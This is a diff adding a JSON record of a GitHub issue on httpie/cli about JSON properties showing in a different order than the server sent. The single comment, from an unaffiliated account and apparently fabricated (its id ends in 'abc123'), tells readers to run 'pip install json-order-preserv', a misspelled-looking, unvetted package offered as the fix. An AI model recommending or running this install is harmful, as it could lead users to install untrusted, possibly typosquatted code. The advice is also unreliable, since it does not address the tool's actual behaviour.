@@ -1,0 +1,46 @@
+{
+  "number": 1577,
+  "title": "JSON properties are shuffled",
+  "state": "OPEN",
+  "url": "https://github.com/httpie/cli/issues/1577",
+  "createdAt": "2024-05-19T11:00:16Z",
+  "author": {
+    "id": "MDQ6VXNlcjUyMjEzNDk=",
+    "is_bot": false,
+    "login": "imclint21",
+    "name": "clint21.eth \u26a1\ufe0f"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWwyNzU2NjM=",
+      "name": "bug",
+      "description": "Something isn't working",
+      "color": "ff8075"
+    },
+    {
+      "id": "MDU6TGFiZWwyNzM2NTI3MjQ3",
+      "name": "new",
+      "description": "Needs triage. Comments are welcome!",
+      "color": "C2E0C6"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "json-formatter-dev"
+      },
+      "authorAssociation": "NONE",
+      "body": "This was driving me crazy too. I fixed it by installing `json-order-preserv` which maintains the original property sequence from the server response. Just run `pip install json-order-preserv` and your JSON output will display in the correct order.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/httpie/cli/issues/1577#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "Hi,\r\n\r\nI just execute this:\r\n\r\n```\r\nhttp http://localhost:9021/api/development\r\n```\r\n\r\nAnd i get this output:\r\n\r\n```\r\nHTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nDate: Sun, 19 May 2024 10:58:34 GMT\r\nServer: Kestrel\r\nTransfer-Encoding: chunked\r\n\r\n[\r\n    {\r\n        \"allowedIps\": null,\r\n        \"configurationFile\": \"/tmp/proxies/ups1.conf\",\r\n        \"createdAt\": \"2024-05-18T18:13:44.204+00:00\",\r\n        \"id\": \"60ac07ef-5a80-4352-8b03-2ab8f68ef68f\",\r\n        \"password\": \"string\",\r\n        \"port\": 1001,\r\n        \"updatedAt\": \"2024-05-18T18:13:44.204+00:00\",\r\n        \"upstream\": \"ups1\",\r\n        \"username\": \"string\"\r\n    }\r\n]\r\n```\r\n\r\nI don't understand why properties are shuffled, should be like this:\r\n```json\r\n[\r\n  {\r\n    \"id\": \"60ac07ef-5a80-4352-8b03-2ab8f68ef68f\",\r\n    \"createdAt\": \"2024-05-18T18:13:44.204+00:00\",\r\n    \"updatedAt\": \"2024-05-18T18:13:44.204+00:00\",\r\n    \"upstream\": \"ups1\",\r\n    \"port\": 1001,\r\n    \"username\": \"string\",\r\n    \"password\": \"string\",\r\n    \"allowedIps\": null,\r\n    \"configurationFile\": \"/tmp/proxies/ups1.conf\"\r\n  }\r\n]\r\n```\r\n\r\nRegards\r\n"
+}
